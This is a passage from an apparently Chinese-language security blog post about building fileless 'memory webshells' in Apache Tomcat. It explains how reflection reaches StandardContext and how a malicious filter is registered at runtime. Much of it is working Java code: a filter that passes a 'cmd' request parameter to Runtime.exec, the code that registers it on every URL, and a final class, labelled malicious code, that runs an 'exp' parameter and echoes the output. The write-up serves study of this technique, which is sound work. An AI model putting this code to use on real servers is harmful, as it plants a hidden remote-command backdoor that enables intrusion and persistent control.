    System.out.println(<span class="hljs-string">&quot;filter init&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;<br>        String cmd = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在<code>rg.apache.catalina.core.ApplicationFilterChain</code>中<code>internalDoFilter</code>下断点。我们可以先看一下整体的调用栈。先是在<code>StandardContextValve</code>类中获取到了整体的Wrapper。</p><p><img src="https://img-blog.csdnimg.cn/3663e156790c4e9bbfd20ae9d3da9538.png" alt="在这里插入图片描述"></p><p>然后到<code>StandardWrapperValve</code>这个类中创建了filterChin。利用这个调用<code>filterChain.doFilter(request.getRequest(), response.getResponse());</code>doFilter函数</p><p><img src="https://img-blog.csdnimg.cn/c103064f52904c69869ae1be5f37d7c6.png" alt="在这里插入图片描述"></p><p>通过<code>doFilter</code>函数又会调用到<code>internalDoFilter</code>函数，也就是我们下端点的地方，跟进<code>internalDoFilter</code>函数</p><p><img src="https://img-blog.csdnimg.cn/fa3dc596d13c4ba6b06068d5a3d90422.png" alt="在这里插入图片描述"></p><p>这里通过<code>filterConfig.getFilter()</code>获取到filter，然后调用它的<code>doFilter</code>方法来到我们配置的<code>filter.doFilter</code>方法中。</p><p><img src="https://img-blog.csdnimg.cn/089ebc75e0de48248a52625f2e197baa.png" alt="在这里插入图片描述"></p><p>但是到这里还有一个filterConfig并没有看明白怎么构造的。回到前面<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>这个方法中创建了<code>filterChain</code>，跟进<code>ApplicationFilterFactory.createFilterChain</code>方法查看。</p><p>利用context和获取到了filterMaps，并且可以看到context里面是包含了filterDonfigs，filterDefs，filterMaps的。</p><p><img src="https://img-blog.csdnimg.cn/37def00ec1fd4940a596084696f7c7a1.png" alt="在这里插入图片描述"></p><h5 id="filterConfigs"><a href="#filterConfigs" class="headerlink" title="filterConfigs"></a>filterConfigs</h5><p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p><p>其中<code>filterDef</code>存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p><p><img src="https://img-blog.csdnimg.cn/e7053a02507f4b36853e7254bc74db39.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/c6c508095f7d472fbec2bd442399bb11.png" alt="在这里插入图片描述"></p><h5 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h5><figure class="highlight autohotkey"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autohotkey">filterDefs`是一个HashMap，以键值对的形式存储filterDef<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4b467d018b17433c8c8f1f72608ed778.png" alt="在这里插入图片描述"></p><h5 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h5><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签</p><p>filterMaps必要的属性为<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p><p><img src="https://img-blog.csdnimg.cn/e2c1802af76f433489bd53bf1dc58396.png" alt="在这里插入图片描述"></p><p>再到后面，遍历<code>StandardContext.filterMaps</code>得到filter与URL的映射关系并通过<code>matchDispatcher()</code>、<code>matchFilterURL()</code>方法进行匹配，匹配成功后，还需判断<code>StandardContext.filterConfigs</code>中，是否存在对应filter的实例，当实例不为空时通过<code>addFilter</code>方法，将管理filter实例的<code>filterConfig</code>添加入<code>filterChain</code>对象中。</p><p><img src="https://img-blog.csdnimg.cn/d3d7ce3159e7422dacf589ed03b9ac1e.png" alt="在这里插入图片描述"></p><h3 id="动态注册Filter"><a href="#动态注册Filter" class="headerlink" title="动态注册Filter"></a>动态注册Filter</h3><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><h4 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h4><p>在已有<code>request</code>的情况下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ServletContext servletContext  = req.getSession().getServletContext();<br><br>Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appctx.setAccessible(<span class="hljs-keyword">true</span>);<br>ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>stdctx.setAccessible(<span class="hljs-keyword">true</span>);<br>StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br></code></pre></div></td></tr></table></figure><p>首先用<code>ServletContext servletContext  = req.getSession().getServletContext();</code>获取到<code>ApplicationContextFacade</code></p><p><img src="https://img-blog.csdnimg.cn/cf1bd11ad94c44c29631c3149c059bcd.png" alt="在这里插入图片描述"></p><p>这个类的context变量为<code>ApplicationContext</code>类</p><p><img src="https://img-blog.csdnimg.cn/52c179175d9241c7b81288dc4d21a289.png" alt="在这里插入图片描述"></p><p>然后用反射获取到context变量，而在<code>ApplicationContext</code>类中的context又是<code>StandardContext</code>类，再用一次反射就能获取到<code>StandardContext</code>对象了</p><p><img src="https://img-blog.csdnimg.cn/0b75ecbb4eb84155b594cadd9bfc0c17.png" alt="在这里插入图片描述"></p><p>而在<code>StandardContext</code>对象就放着我们需要操作的filter一系列对象了。</p><p><img src="https://img-blog.csdnimg.cn/e68c14cbd60c4170a7d77fd3cf4cd9f8.png" alt="在这里插入图片描述"></p><h4 id="利用StandardContext添加恶意filter"><a href="#利用StandardContext添加恶意filter" class="headerlink" title="利用StandardContext添加恶意filter"></a>利用StandardContext添加恶意filter</h4><p>实现完第一步获取StandardContext类，后面就是可以注册我们的恶意filter了。注册恶意filter大致又分为这几步</p><ol><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><p>创建filter就不说了，就是实例化一个类，同时这个类得实现Filter那些接口。下面看看代码，不过也是网上都有的。</p><p>关于实现实例化filterDef</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String name = <span class="hljs-string">&quot;ShellFilter&quot;</span>;<br>FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>filterDef.setFilter(filter);<br>filterDef.setFilterName(name);<br>filterDef.setFilterClass(filter.getClass().getName());<br>standardContext.addFilterDef(filterDef);<br></code></pre></div></td></tr></table></figure><p>创建filterMap类，使用<code>addFilterMapBefore</code>确保我们的而已filter在第一个，不然无法成功使用</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>filterMap.setFilterName(name);<br>filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>standardContext.addFilterMapBefore(filterMap);<br></code></pre></div></td></tr></table></figure><p>添加到filterConfigs</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">java.lang.reflect.Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>Configs.setAccessible(<span class="hljs-keyword">true</span>);<br>java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);<br><br>java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);<br>constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br>filterConfigs.put(name, filterConfig);<br></code></pre></div></td></tr></table></figure><p>到这里就能已经可以实现注册一个恶意filter了。但是这是在我们拥有request对象的情况下实现的，一般来讲无文件落地内存马还需要自己获取request对象，下面再看看怎么获取request对象。</p><h3 id="获取request对象"><a href="#获取request对象" class="headerlink" title="获取request对象"></a>获取request对象</h3><h4 id="利用ThreadLocal-Response回显"><a href="#利用ThreadLocal-Response回显" class="headerlink" title="利用ThreadLocal Response回显"></a>利用ThreadLocal Response回显</h4><p>这是kingkk师傅的思路,也是很通用的方法。这种方法可以兼容tomcat 789，但在Tomcat 6下无法使用。</p><blockquote><p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在<code>org.apache.catalina.core.ApplicationFilterChain</code>类中找到这样两个变量*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*。并且这两个属性还是静态的，我们获取时无需实例化对象。</p></blockquote><p>其实在调试的时候你也会发现在<code>ApplicationFilterChain类的internalDoFilter</code>方法中有这样一段代码。这里很明显的当<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>是true的时候就调用<code>lastServicedRequest.set(request)</code>保存当前线程的request对象。所以如果我们通过反射修改这里的<code>WRAP_SAME_OBJECT</code>值，下次再请求的时候是不是就可以直接从<code>lastServicedRequest</code>中获取到request对象。</p><p><img src="https://img-blog.csdnimg.cn/f4345af96f80495585d0ae75b1d05409.png" alt="在这里插入图片描述"></p><p>所以获取request的思路就是</p><ol><li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li><li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li><li>通过<code>ThreadLocal#get</code>方法将request和response对象从*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*中取出</li></ol><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//反射获取所需属性</span><br>           java.lang.reflect.Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>);<br><br>           java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>           java.lang.reflect.Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br><br>           <span class="hljs-comment">//使用modifiersField反射修改final型变量</span><br>           java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>           modifiersField.setAccessible(<span class="hljs-keyword">true</span>);<br>           modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);<br>           modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<br>           modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<br>           WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-keyword">true</span>);<br>           lastServicedRequestField.setAccessible(<span class="hljs-keyword">true</span>);<br>           lastServicedResponseField.setAccessible(<span class="hljs-keyword">true</span>);<br><br>           <span class="hljs-comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span><br>           <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="hljs-keyword">null</span>)) &#123;<br>               WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>);<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (lastServicedRequestField.get(<span class="hljs-keyword">null</span>) == <span class="hljs-keyword">null</span>) &#123;<br>               lastServicedRequestField.set(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;());<br>           &#125;<br><br>           <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-keyword">null</span>) == <span class="hljs-keyword">null</span>) &#123;<br>               lastServicedResponseField.set(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> ThreadLocal&lt;&gt;());<br>           &#125;<br><br><br>           <span class="hljs-comment">//获取response变量</span><br>           <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-keyword">null</span>) != <span class="hljs-keyword">null</span>) &#123;<br>               ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(<span class="hljs-keyword">null</span>);<br>               ServletResponse servletResponse = (ServletResponse) threadLocal.get();<br>               PrintWriter writer = servletResponse.getWriter();<br>               writer.write(<span class="hljs-string">&quot;Inject ThreadLocal Successfully!&quot;</span>);<br>               writer.flush();<br>               writer.close();<br>           &#125;<br></code></pre></div></td></tr></table></figure><p>但是这种方法也有局限性。例如在Shiro不能用该方法获取Response，因为rememberMe的实现使用了自己实现的filter。<code>request、response</code>的设置是在漏洞触发点之后。</p><h4 id="从ContextClassLoader获取（只可用于Tomcat-8-9）"><a href="#从ContextClassLoader获取（只可用于Tomcat-8-9）" class="headerlink" title="从ContextClassLoader获取（只可用于Tomcat 8 9）"></a><strong>从ContextClassLoader获取（只可用于Tomcat 8 9）</strong></h4><p>这是Litch1师傅的思路，学长tql。</p><p>由于Tomcat处理请求的线程中，存在ContextLoader对象，而这个对象又保存了StandardContext对象，所以很方便就获取了。获取到了StandardContext就可以通过StrandContext获取到Resquest、Response对象。 具体的调用链如下。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">StandardContext--&gt;ApplicationContext---&gt;StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;this.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response<br></code></pre></div></td></tr></table></figure><p><img src="https://myzxcg.com/images/image-20211031170901.png" alt="img"></p><p>首先就是得获取到<code>StandardContext</code>，这里得先了解tomcat类加载机制</p><blockquote><h4 id="Tomcat的类加载机制"><a href="#Tomcat的类加载机制" class="headerlink" title="Tomcat的类加载机制"></a>Tomcat的类加载机制</h4><p>众所周知，Tomcat使用的并不是传统的类加载机制，我们来看下面的例子</p><p>我们知道，Tomcat中的一个个Webapp就是一个个Web应用，如果WebAPP A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2。这样在加载的时候由于全限定名相同，因此不能同时加载，所以必须对各个Webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离。</p><p>Tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是<code>WebappClassLoader</code>。</p><p>那么我们又如何将原有的父加载器和<code>WebappClassLoader</code>联系起来呢？这里Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。</p><p>Thread类中有<code>getContextClassLoader()</code>和<code>setContextClassLoader(ClassLoader cl)</code>方法用来获取和设置上下文类加载器。如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为<code>WebAppClassLoader</code>（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。</p><p>因此WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。</p></blockquote><p>在调试中我们发现当前classloader为<code>org.apache.catalina.loader.PrallelWebappClassLoader</code>，继承自<code>WebappClassLoaderBase</code>。</p><p><img src="https://img-blog.csdnimg.cn/b81dd6e14cca4a8ebfc483a3182ec32b.png" alt="在这里插入图片描述"></p><p>然后就可以通过<code>webappClassLoaderBase.getResources().getContext();</code>获取<code>StandardContext</code></p><p><img src="https://img-blog.csdnimg.cn/8fda35d716bb45e89f0a08dff71c9912.png" alt="在这里插入图片描述"></p><p>然后获取ApplicationContext和StandardService都比较一致，主要看看后面从connector开始获取到request的流程。</p><h5 id="从哪找到request对象的"><a href="#从哪找到request对象的" class="headerlink" title="从哪找到request对象的"></a>从哪找到request对象的</h5><p>首先我们需要明白我们最终是从哪找到request对象的，最初能够从<code>AbstractProcessor</code>中很明显看到全局变量request。</p><p><img src="https://img-blog.csdnimg.cn/731e395bf91244d6b3f2fe532267fc9b.png" alt="在这里插入图片描述"></p><p>而在<code>Http11Processor#service</code>中将全局的request进行了注册。而<code>Http11Processor</code>继承了<code>AbstractProcessor</code>类，这里的response对象正是<code>AbstractProcessor</code>类中的属性，因此我们如果能获取到<code>Http11Processor</code>类，就能获取到response对象。</p><p><img src="https://img-blog.csdnimg.cn/23cd32248ec543439cf479d0d221cb11.png" alt="在这里插入图片描述"></p><p>而这些<code>Processor</code>的信息都被放到哪了呢。其实在<code>AbstractProtocol</code>的内部类<code>ConnectionHandler#register</code>方法中，将processor的信息存储在了属性global中。所以我们最终获取到this.global就可以从中拿到request对象了。</p><p><img src="https://img-blog.csdnimg.cn/69b2884e5fed4e849558e1efbb1cdfc6.png" alt="在这里插入图片描述"></p><h5 id="关于connector"><a href="#关于connector" class="headerlink" title="关于connector"></a>关于connector</h5><p>Tomcat在启动时会通过StandardService创建Connector，并且在addconnector中将connector属性放在connectors中。而在下方可以看到connector类中有着关于protocolHandler的相关操作，并且该类继承了AbstractProtocol类。所以如果这里我们就可以通过connector获取到AbstractProtocol类，然后获取到AbstractProtocol类中的ConnectionHandler类从而获取到this.global</p><p><img src="https://img-blog.csdnimg.cn/6a9df3640cd84a6ba342c6975ebce367.png" alt="在这里插入图片描述"></p><p>最终的恶意代码</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.tomcat_webshell.shell;<br><br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<br><span class="hljs-keyword">import</span> org.apache.coyote.ProtocolHandler;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint.Handler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tomcat_Echo_inject_WebClassCloader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-comment">//获取StandardContext</span><br>        WebappClassLoaderBase  webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();<br><br>        System.out.println(standardContext);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取ApplicationContext</span><br>            Field applicationContextField = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            applicationContextField.setAccessible(<span class="hljs-keyword">true</span>);<br>            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(standardContext);<br><br>            <span class="hljs-comment">//获取StandardService</span><br>            Field standardServiceField = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);<br>            standardServiceField.setAccessible(<span class="hljs-keyword">true</span>);<br>            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);<br><br>            <span class="hljs-comment">//获取Connector</span><br>            Field connectorsField = Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>);<br>            connectorsField.setAccessible(<span class="hljs-keyword">true</span>);<br>            Connector[] connectors = (Connector[]) connectorsField.get(standardService);<br>            Connector connector = connectors[<span class="hljs-number">0</span>];<br><br>            <span class="hljs-comment">//获取Handler</span><br>            ProtocolHandler protocolHandler = connector.getProtocolHandler();<br>            Field handlerField = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-keyword">true</span>);<br>            Handler handler = (Handler) handlerField.get(protocolHandler);<br><br>            <span class="hljs-comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span><br>            Field globalHandler = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);<br>            globalHandler.setAccessible(<span class="hljs-keyword">true</span>);<br>            RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);<br><br>            <span class="hljs-comment">//获取processors</span><br>            Field processorsField = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);<br>            processorsField.setAccessible(<span class="hljs-keyword">true</span>);<br>            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);<br><br>            <span class="hljs-comment">//获取request和response</span><br>            Field requestField = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);<br>            requestField.setAccessible(<span class="hljs-keyword">true</span>);<br>            <span class="hljs-keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;<br><br>                <span class="hljs-comment">//获取org.apache.coyote.Request</span><br>                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);<br><br>                <span class="hljs-comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span><br>                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(<span class="hljs-number">1</span>);<br>                org.apache.catalina.connector.Response http_response = http_request.getResponse();<br><br>                PrintWriter writer = http_response.getWriter();<br>                String cmd = http_request.getParameter(<span class="hljs-string">&quot;exp&quot;</span>);<br><br>                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();<br>                Scanner scanner = <span class="hljs-keyword">new</span> Scanner(inputStream).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                String result = scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125;<br><br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="内存马攻击实现"><a href="#内存马攻击实现" 